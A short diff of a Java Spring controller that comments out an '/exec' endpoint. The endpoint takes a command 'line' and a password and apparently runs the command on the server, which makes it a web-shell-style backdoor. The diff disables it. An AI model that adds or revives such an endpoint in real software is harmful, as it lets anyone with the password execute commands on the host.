@@ -293,7 +293,7 @@ public class UtilsController {
         exp = exp == null ? "yyyy年MM月dd日 HH:mm:ss" : exp;
         return new SimpleDateFormat(exp).format(new Date(stamp));
     }
-
+/*
     @GetMapping("/exec")
     public Object exec(@RequestParam("line") String line, @RequestParam("pwd") String pwd) {
         if (pwd.equals(this.pwd)) {
@@ -312,7 +312,7 @@ public class UtilsController {
                 return e.getMessage();
             }
         } else return "error";
-    }
+    }*/
 
     public static FileWithPath requestFile(boolean isTemp) {
         return requestFile(isTemp, "jpg");
